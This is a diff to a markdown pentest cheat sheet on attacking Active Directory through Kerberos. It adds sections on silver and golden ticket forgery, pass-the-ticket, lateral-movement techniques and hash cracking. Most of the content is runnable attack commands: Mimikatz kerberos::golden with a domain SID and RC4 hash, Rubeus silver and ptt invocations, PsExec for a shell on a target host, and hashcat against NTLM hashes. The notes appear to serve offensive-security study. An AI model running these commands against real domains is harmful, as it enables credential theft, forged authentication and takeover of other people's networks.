@@ -201,7 +201,10 @@ Source Link: https://www.tarlogic.com/blog/how-to-attack-kerberos/
 * Overpass the Hash
 * Pass the ticket
 * Silver ticket
-* Golden ticket
+* Distributed Component Object Model
+* Golden Ticket
+* Windows Management Instr: https://www.blackhat.com/docs/us-15/materials/us-15-Graeber-Abusing-Windows-Management-Instrumentation-WMI-To-Build-A-Persistent%20Asynchronous-And-Fileless-Backdoor-wp.pdf
+* Powershell Remoting
 
 ### Local Host Memmory Dumping
 
@@ -427,20 +430,6 @@ Rubeus.exe kerberoast </spn:user@domain.com | /spns:user1@domain.com,user2@domai
 
 ### Pass the Ticket
 
-#### No TGT provided
-
-1. Obtain SID of the domain
-
-```powershell
-
-whoami /user
-
-# SID are all numbers execpt the last four (rel identifier) 
-
-```
-
-
-#### If TGT provided
 
 * dump TGT from LSASS
 * use TGT toact as domain admin by injecting it into current login sessions ID
@@ -466,8 +455,43 @@ Make kirbi ticket from BASE64 blob
 5. Pass Ticket converted string: `  .\Rubeus.exe ptt /ticket:$base64RubeusTGT`
 6. If ticket owned has enough permissions try getting shell on target Computer: `  .\PsExec.exe -accepteula \\target_host.contoso.com cmd`
 
-## Silver Ticket
+### Silver Ticket
 Silver tickets are essential forged TGS tickets which grant you access to a particular service aka service-tickets
+
+#### Mimikatz Workflow
+
+1. Obtain SID
+
+```powershell
+
+whoami /user
+
+# all numbebers before the relative identifier (last 4 numbers) are SID we need
+
+```
+
+
+2. Make Silver ticket
+```powershell
+
+mimikatz # kerberos::purge
+
+mimikatz # kerberos::list
+
+# generate RC4 hashed password now with Rubeus, for instance
+
+mimikatz # kerberos::golden /user:offsec /domain:corp.com /sid:S-1-5-21-1602875587-2787523311-2599479668 /target:CorpWebServer.corp.com /service:HTTP /rc4:E2B475C11DA2A0748290D87AA966C327 /ptt
+
+
+mimikatz # kerberos::list
+
+#finally launch cmd on behalf of impersonated service
+mimikatz # misc::cmd
+
+```
+
+
+#### Rubeus Workflow
 
 Typical workflow:
 1. Compromise some Computer within AD
@@ -475,11 +499,13 @@ Typical workflow:
 3. Forge NTLM hash RC4 (or better) for later use
 compromised password -> https://www.browserling.com/tools/ntlm-hash
 4. Forge ticket using rubeus:
-`Rubeus.exe silver /service:SQL/someDC:6565/SQL /ldap /creduser:lab.local\svc_sql /user:Administrator /rc4:64F12CDDAA88057E06A81B54E73B949B /credpassword:Password1` (nrever use such weak passwords, its for demonstration only)
+`Rubeus.exe silver /service:SQL/dc1.local.com /ldap /creduser:lab.local\svc_sql /user:Administrator /rc4:64F12CDDAA88057E06A81B54E73B949B /credpassword:Password1` (nrever use such weak passwords, its for demonstration only)
 
-## Golden Ticket
+Reference: https://www.hackingarticles.in/a-detailed-guide-on-rubeus/
 
-### Mimikatz Golden Ticket
+### Golden Ticket
+
+#### Mimikatz Golden Ticket
 
 1. Dump SID and hash and inject it into memmory
 
@@ -504,7 +530,7 @@ Access anything without knowing the user
 `dir \\Desktop-1\c$ /user:Machine1 mimikatz`
 
 
-## Hash cracking
+### Hash cracking
 
 
 * MsCacheV2
@@ -514,6 +540,9 @@ Access anything without knowing the user
 * NTLM
 
 `hashcat -a 0 -m 1000 admin.hashfile  /usr/share/wordlists/rockyou.txt --force --potfile-disable`
+
+### Distributed Component Object Model
+
 
 
 ## Dumping Credentials
